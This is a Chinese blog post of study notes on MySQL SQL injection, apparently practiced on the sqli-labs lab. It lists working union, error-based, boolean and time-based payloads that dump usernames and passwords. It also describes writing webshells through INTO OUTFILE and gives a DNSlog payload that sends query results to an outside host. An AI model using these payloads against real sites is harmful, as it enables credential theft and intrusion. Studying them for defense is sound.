<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入学习 | Mars1y</title><meta name="author" content="Mars1y"><meta name="copyright" content="Mars1y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="概述前置知识–+​		MySQL 中有三种注释符：# 、--空格 、&#x2F;**&#x2F; 。  ​		url 中 # 会被浏览器解释为指导其动作的那个 # 号，所以如果需要使用 # ，需先将其 url 编码为 %23 。 ​		对于 --空格 ，在 url 传入 --+ 时，+ 号到后端后会变为空格。 123&lt;?phpecho $_GET[&#x27;cmd&#x27;];?&gt;  ​		传入 ?c">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入学习">
<meta property="og:url" content="http://example.com/2024/02/25/SQL%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Mars1y">
<meta property="og:description" content="概述前置知识–+​		MySQL 中有三种注释符：# 、--空格 、&#x2F;**&#x2F; 。  ​		url 中 # 会被浏览器解释为指导其动作的那个 # 号，所以如果需要使用 # ，需先将其 url 编码为 %23 。 ​		对于 --空格 ，在 url 传入 --+ 时，+ 号到后端后会变为空格。 123&lt;?phpecho $_GET[&#x27;cmd&#x27;];?&gt;  ​		传入 ?c">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/avatar.jpg">
<meta property="article:published_time" content="2024-02-24T16:00:00.000Z">
<meta property="article:modified_time" content="2024-02-25T10:57:57.900Z">
<meta property="article:author" content="Mars1y">
<meta property="article:tag" content="web安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/02/25/SQL%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL注入学习',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-02-25 18:57:57'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mogai.css"><link rel="stylesheet" href="/css/font/iconfont.css"><link rel="stylesheet" href="/css/yituliu.css"><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Mars1y" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon--home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-exe-article-primary"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-Link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-geren"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="Mars1y"></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon--home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-exe-article-primary"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-Link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-geren"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2024-02-24T16:00:00.000Z" title="发表于 2024-02-25 00:00:00">2024-02-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="–"><a href="#–" class="headerlink" title="–+"></a>–+</h3><p>​		MySQL 中有三种注释符：<code>#</code> 、<code>--空格</code> 、<code>/**/</code> 。 </p>
<p>​		url 中 # 会被浏览器解释为指导其动作的那个 # 号，所以如果需要使用 # ，需先将其 url 编码为 %23 。</p>
<p>​		对于 <code>--空格</code> ，在 url 传入 <code>--+</code> 时，+ 号到后端后会变为空格。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​		传入 <code>?cmd=--+123</code> ：</p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/14.png"></p>
<h3 id="select-1-database"><a href="#select-1-database" class="headerlink" title="select 1, database()"></a>select 1, database()</h3><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/1.png"></p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/2.png"></p>
<h3 id="引号、括号问题"><a href="#引号、括号问题" class="headerlink" title="引号、括号问题"></a>引号、括号问题</h3><p>​		它可能查不到结果，但它不会报错：</p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/3.png"></p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/4.png"></p>
<p>​		无论加几个半括号都可以：</p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/5.png"></p>
<h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><ul>
<li>system_user()：MySQL 用户名</li>
<li>user()：用户名</li>
<li>current_user：当前用户名</li>
<li>session_user()：连接数据库的用户名</li>
<li>database()：数据库名</li>
<li>version()、@@version：MySQL 版本</li>
<li>@@datadir：数据库路径</li>
<li>@@basedir：MySQL安装路径</li>
<li>@@version_compile_os：操作系统</li>
</ul>
<h3 id="一些语句"><a href="#一些语句" class="headerlink" title="一些语句"></a>一些语句</h3><ul>
<li>show databases：查看所有库名</li>
<li>show tables：查看当前库下所有表名</li>
<li>show columns from xxx：查看 xxx 表的所有字段名，如果表名是数字，需要用反引号包围</li>
</ul>
<h3 id="information-schema库三表"><a href="#information-schema库三表" class="headerlink" title="information_schema库三表"></a>information_schema库三表</h3><ul>
<li>information_schema.schemata：存储 MySQL 中的所有数据库的库名</li>
<li>information_schema.tables：存储 MySQL 中的所有数据表的表名</li>
<li>information_schema.columns：存储 MySQL 中的所有列的列名</li>
</ul>
<blockquote>
<p>MySQL5.0 以下，没有 information_schema 数据库。</p>
<p>MySQL5.0 以上，默认添加了一个名为 information_schema 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
</blockquote>
<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>​		<code>id=1&#39;</code> 、<code>id=1&quot;</code> 、<code>id=1&#39;)</code> 、 <code>id=1&#39;))</code>  、<code>id=1&quot;)</code>  、<code>id=1&quot;))</code> 等。</p>
<h3 id="闭合推理"><a href="#闭合推理" class="headerlink" title="闭合推理"></a>闭合推理</h3><p>​		示例，sqli-labs Less-7 ：</p>
<ul>
<li>1’：错</li>
<li>1” ：成</li>
<li>推出 ‘$id’</li>
<li>1’–+ ：错</li>
<li>推翻 ‘$id’</li>
<li>1’)–+：错</li>
<li>1’)) –+：成</li>
<li>推出 ((‘$id’))</li>
</ul>
<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><h3 id="爆语句"><a href="#爆语句" class="headerlink" title="爆语句"></a>爆语句</h3><p>​		注入点检测。</p>
<h3 id="爆字段数"><a href="#爆字段数" class="headerlink" title="爆字段数"></a>爆字段数</h3><p>​		<code>?id=1&#39; order by N--+</code></p>
<h3 id="爆回显位置"><a href="#爆回显位置" class="headerlink" title="爆回显位置"></a>爆回显位置</h3><p>​		<code>?id=-1&#39; union select 1,2,3--+</code></p>
<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p>​		<code>?id=-1&#39; union select 1,2,database()--+</code></p>
<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p>​		<code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;xxx&#39;--+</code></p>
<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><ul>
<li>精确到表：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;xxx&#39; and table_name=&#39;xxx&#39;--+</code></li>
<li>精确到库：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;xxx&#39;--+</code></li>
</ul>
<h3 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h3><p>​		<code>?id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.users--+</code></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE(xml_document, xpath_string)</span><br><span class="line">- xml_document：XML 文档名</span><br><span class="line">- xpath_string：目标 XML 标签在标签树的路径，如 `/book/author` 。</span><br></pre></td></tr></table></figure>

<p>​		从目标 XML 文档中根据 xpath 匹配标签，匹配成功则返回其所包含的内容，未匹配到则返回 NULL 。</p>
<p>​		extractvalue 使用时，当 xpath 格式出现错误，MySQL 会爆出 xpath 语法错误。</p>
<p>​		注意不能用 group_concat() ，因为返回值太多了不能正常回显，只能 <code>limit N, 1</code> 来慢慢爆。 </p>
<ul>
<li><code>?id=1&#39; and extractvalue(1, concat(0x7e,(select @@version),0x7e))--+</code>：爆数据库版本</li>
<li><code>?id=1&#39; and extractvalue(1, concat(0x7e,(select database()),0x7e))--+</code> ：爆库名</li>
<li><code>?id=1&#39; and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;xxx&#39; limit N,1),0x7e))--+</code> ：爆表名</li>
<li><code>?id=1&#39; and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_schema=&#39;xxx&#39; and table_name=&#39;xxx&#39; limit N,1),0x7e))--+</code>：爆列名</li>
<li><code>?id=1&#39; and extractvalue(1, concat(0x7e,(select concat(username,0x7e,password) from security.users limit N,1),0x7e))--+</code> ：爆值</li>
</ul>
<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateXML(xml_target, xpath_expr, new_xml)</span><br></pre></td></tr></table></figure>

<p>​		用 new_xml 替换根据 xpath_expr 在 xml_target 匹配到的内容，然后返回更改后的 XML 。如果 xpath_expr 未找到匹配的表达式，或者找到多个匹配项，该函数将返回原始 xml_target 。</p>
<p>​		所有三个参数都应该是字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">UpdateXML(&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&#x27;, &#x27;/a&#x27;, &#x27;&lt;e&gt;fff&lt;/e&gt;&#x27;) AS val1,</span><br><span class="line">UpdateXML(&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&#x27;, &#x27;/b&#x27;, &#x27;&lt;e&gt;fff&lt;/e&gt;&#x27;) AS val2,</span><br><span class="line">UpdateXML(&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&#x27;, &#x27;//b&#x27;, &#x27;&lt;e&gt;fff&lt;/e&gt;&#x27;) AS val3,</span><br><span class="line">UpdateXML(&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&#x27;, &#x27;/a/d&#x27;, &#x27;&lt;e&gt;fff&lt;/e&gt;&#x27;) AS val4,</span><br><span class="line">UpdateXML(&#x27;&lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&#x27;, &#x27;/a/d&#x27;, &#x27;&lt;e&gt;fff&lt;/e&gt; &#x27;) AS val5</span><br><span class="line"></span><br><span class="line">val1: &lt;e&gt;fff&lt;/e&gt;</span><br><span class="line">val2: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val3: &lt;a&gt;&lt;e&gt;fff&lt;/e&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val4: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;e&gt;fff&lt;/e&gt;&lt;/a&gt;</span><br><span class="line">val5: &lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>​		updatexml 使用时，当 xpath 格式出现错误，MySQL 会爆出 xpath 语法错误。</p>
<p>​		注入命令类似 extractvalue() ，多加个参数值 1 就是了。</p>
<h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>​		<code>select count(*), floor(rand(0)*2) x from xxx group by x;</code> 。</p>
<p>​		rand(0) 将产生 0<del>1 的随机数，rand(0)*2 将产生 0</del>2 的随机数，floor(rand(0)*2) 将得到 0 或 1 。floor() 报错注入的本质是 group by 语句的报错，group by 语句报错的原因是 floor(rand(0)*2) 的不确定性，即可能为 0 或 1 。</p>
<p>​		group by key 执行时，将依次读取数据表的每一行，将结果保存于临时表中。读取每一行的 key 时，如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算rand值）；如果 key 不存在于临时表中，则在临时表中插入 key 所在行的数据（插入数据时，会再计算rand 值）。例如，临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临时表，由于是随机数，插时要计算一下随机值，此时 floor(rand(0)*2) 的结果可能为 1，就会导致插入时冲突而报错。</p>
<ul>
<li><code>?id=1&#39; union select 1,count(*),concat((select database()),0x7e,floor(rand(0)*2)) a from information_schema.schemata group by a--+</code>：爆库名</li>
<li><code>?id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&#39;xxx&#39; limit N,1),0x7e,floor(rand(0)*2)) a from information_schema.columns group by a--+</code>：爆表名</li>
<li><code>?id=1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_schema=&#39;xxx&#39; and table_name=&#39;xxx&#39; limit N,1),0x7e,floor(rand(0)*2)) a from information_schema.columns group by a--+</code>：爆列名</li>
<li><code>?id=1&#39; union select 1,count(*),concat((select password from security.users limit N,1),0x7e,floor(rand(0)*2)) a from information_schema.columns group by a--+</code>：爆值</li>
</ul>
<h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><p>​		前提：MySQL 版本 5.5~5.5.49，此时数据超出 DOUBLE 才会报错，同时会返回查询信息，而不是像这样：</p>
<p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/13.png"></p>
<p>​		前置知识：</p>
<ul>
<li>exp(x)：返回 e 的 x 次方计算结果</li>
<li>如果一个查询成功执行，则其返回值为 0</li>
<li>~0 将得到 18 446 744 073 709 551 615 ，无符号 BIGINT 范围 <code>(0, 18 446 744 073 709 551 615)</code> 。</li>
</ul>
<p>​		所以构造 payload 如 <code>?id=1&#39; and exp(~(select * from (select database())x))--+</code></p>
<h3 id="查询重复"><a href="#查询重复" class="headerlink" title="查询重复"></a>查询重复</h3><p>​		<code>?id=1&#39; union select 1,2,3 from (select name_const(version(),1),name_const(version(),1)) x --+</code></p>
<p>​		<code>SELECT NAME_CONST(&#39;My Name&#39;, 7);</code> 相当于 <code>SELECT 7 AS &#39;My Name&#39;;</code> ，规定前一个参数值为列名字符串，后一个值为常量。</p>
<h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h2><h3 id="id-1’-and-left-version-1-N–"><a href="#id-1’-and-left-version-1-N–" class="headerlink" title="?id&#x3D;1’ and left(@@version,1)&#x3D;N–+"></a>?id&#x3D;1’ and left(@@version,1)&#x3D;N–+</h3><p>​		猜数据库版本。</p>
<h3 id="id-1’-and-length-database-N–"><a href="#id-1’-and-length-database-N–" class="headerlink" title="?id&#x3D;1’ and length(database())&#x3D;N–+"></a>?id&#x3D;1’ and length(database())&#x3D;N–+</h3><p>​		猜库名长度。</p>
<h3 id="id-1’-and-left-database-1-’a’–-、-id-1’-and-left-database-2-’sa’–"><a href="#id-1’-and-left-database-1-’a’–-、-id-1’-and-left-database-2-’sa’–" class="headerlink" title="?id&#x3D;1’ and left(database(),1)&gt;’a’–+、?id&#x3D;1’ and left(database(),2)&gt;’sa’–+"></a>?id&#x3D;1’ and left(database(),1)&gt;’a’–+、?id&#x3D;1’ and left(database(),2)&gt;’sa’–+</h3><p>​		猜库名。</p>
<h3 id="id-1’-and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-M-1-N-1-101"><a href="#id-1’-and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-M-1-N-1-101" class="headerlink" title="?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit M,1),N,1))&#x3D;101"></a>?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit M,1),N,1))&#x3D;101</h3><p>​		猜表名。</p>
<h3 id="id-1’-and-1-select-1-from-information-schema-columns-where-table-schema-’xxx’-and-table-name-regexp-‘xxx’-limit-N-1-–"><a href="#id-1’-and-1-select-1-from-information-schema-columns-where-table-schema-’xxx’-and-table-name-regexp-‘xxx’-limit-N-1-–" class="headerlink" title="?id&#x3D;1’ and 1&#x3D;(select 1 from information_schema.columns where table_schema&#x3D;’xxx’ and table_name regexp ‘xxx’ limit N,1)–+"></a>?id&#x3D;1’ and 1&#x3D;(select 1 from information_schema.columns where table_schema&#x3D;’xxx’ and table_name regexp ‘xxx’ limit N,1)–+</h3><p>​		猜表名，正则匹配。</p>
<h3 id="id-1’-and-ord-mid-select-ifnull-cast-username-as-char-0x20-from-security-users-order-by-id-limit-M-1-N-1-68–"><a href="#id-1’-and-ord-mid-select-ifnull-cast-username-as-char-0x20-from-security-users-order-by-id-limit-M-1-N-1-68–" class="headerlink" title="?id&#x3D;1’ and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit M,1),N,1))&#x3D;68–+"></a>?id&#x3D;1’ and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit M,1),N,1))&#x3D;68–+</h3><p>​		猜值。</p>
<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>​		利用 sleep()、benchmark() 等函数让 MySQL 的执行时间变长，多与 if(expr1,expr2,expr3) 结合使用。</p>
<blockquote>
<p>benchmark() 函数，用于测试 MySQL 对指定操作的执行速度。 </p>
<p><code>benchmark(count,expr)</code></p>
<p>重复计算 expr 表达式 count 次，通过这种方式就可以评估出 MySQL 执行这个表达式的效率。这个函数的返回值始终是 0 。</p>
<p>效率参考的地方： <code>1 row in set (4.74 sec)</code> ，MySQL 提示的执行时间。</p>
</blockquote>
<p>​		<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51330619/article/details/120392450">延时注入中的benchmark</a></p>
<p>​		将 expr2 设置为 sleep() 等函数，如果 expr1 为 true，则浏览器转 sleep() 里的秒数后再回显，否则直接回显。所用到的猜解语句同布尔注入类似，不多演示，仅展示一例：</p>
<p>​		<code>?id=1&#39; and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+</code> ：猜库名。</p>
<h2 id="导出文件"><a href="#导出文件" class="headerlink" title="导出文件"></a>导出文件</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p>​		MySQL <code>SELECT ... INTO OUTFILE &quot;file&quot;</code> ，将结果写入文件：</p>
<ul>
<li>该文件不能事先就存在</li>
<li>数据库用户需拥有 FILE 权限</li>
<li>文件路径要与 secure_file_priv 的设置不冲突</li>
</ul>
<p>​		MySQL 默认不能导入和导出文件，这与 secure_file_priv 的值有关（默认为null）。secure_file_priv 参数是用来限制 LOAD DATA、SELECT … INTO OUTFILE、LOAD_FILE() 的文件到哪个指定目录的。</p>
<ul>
<li>当 secure_file_priv 的值为 null ，表示不允许导入、导出</li>
<li>当 secure_file_priv 的值为如 &#x2F;tmp&#x2F; ，表示导入、导出只能发生在 &#x2F;tmp&#x2F; 目录下</li>
<li>当 secure_file_priv 的值为空，表示不对导入、导出做限制</li>
</ul>
<p>​		使用 <code>show variables like &#39;secure_file_priv&#39;</code> 命令来查看 secure_file_priv 设置。</p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ol>
<li>获取 secure_file_priv 的值。</li>
<li>如果 secure_file_priv 设置为空，则可以写入到网址根目录的文件里，从而通过 url 访问来查看写入内容或写入木马连接蚁剑。否则，只能按照 secure_file_priv 的设置写文件，并在其指定目录下查看。</li>
<li>获取字段数：<code>?id=1&#39;)) order by 3--+</code> 。</li>
<li>依次获取库名、表名、列名、值，类似普通注入，只是改成 <code>SELECT ... INTO OUTFILE &quot;file&quot;</code> 而已。</li>
</ol>
<h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><h3 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h3><p>​		UNC 路径是一种用于在计算机网络中标识资源位置的标准命名格式。UNC 路径通常用于访问共享文件夹或打印机等网络资源。</p>
<p>​		UNC路径的一般格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\&lt;计算机名称&gt;\&lt;共享资源名称&gt;\&lt;子目录&gt;\...</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;计算机名称&gt;</code> 是共享资源所在的计算机的名称或网络地址。</li>
<li><code>&lt;共享资源名称&gt;</code> 是共享文件夹或打印机的名称。</li>
<li><code>&lt;子目录&gt;</code> 是共享资源下的子文件夹名称，可以有多级子目录。</li>
</ul>
<p>​		例如，假设有一个名为 “Server” 的计算机共享了一个名为 “SharedFolder” 的文件夹，其中包含一个名为 “Documents” 的子文件夹。UNC 路径可以表示为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\Server\SharedFolder\Documents</span><br></pre></td></tr></table></figure>

<p>​		UNC 路径的好处是它可以在网络中唯一地标识资源的位置，而不依赖于驱动器号或具体的物理路径。这使得在访问网络资源时，不受驱动器映射和物理路径变化的影响，提供了更好的可移植性和灵活性。</p>
<h3 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h3><p>​		DNSlog 注入的核心就是使用 load_file() 函数读取攻击者设置的站点上的文件，SQL 语句执行时把查询内容拼接到 url 上，进行数据外带，一般用于盲注。</p>
<p>​		payload：<code>?id=1&#39; union select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.tvekqu.dnslog.cn/a.txt&#39;)--+</code> 。</p>
<p>​		a.txt 存不存在不重要，但一定要加上一个文件路径。</p>
<p>​		四个 <code>\</code> 是因为进行了转义。</p>
<p>​		<strong>补充说明</strong>：可以用 load_file() 来读取被攻击站点上的文件。</p>
<ol>
<li>需要先获取 secure_file_priv 的值，查看 load_file() 函数可操作的范围。</li>
<li>欲读取文件必须小于 <code>max_allowed_packet</code> ，可使用 <code>show global variables like &#39;max_allowed_packet&#39;;</code> 查看。</li>
<li>如果欲读文件不存在，或权限等原因而不能被读出，函数将返回 NULL 。</li>
</ol>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>​		二次注入就是将可能导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入。</p>
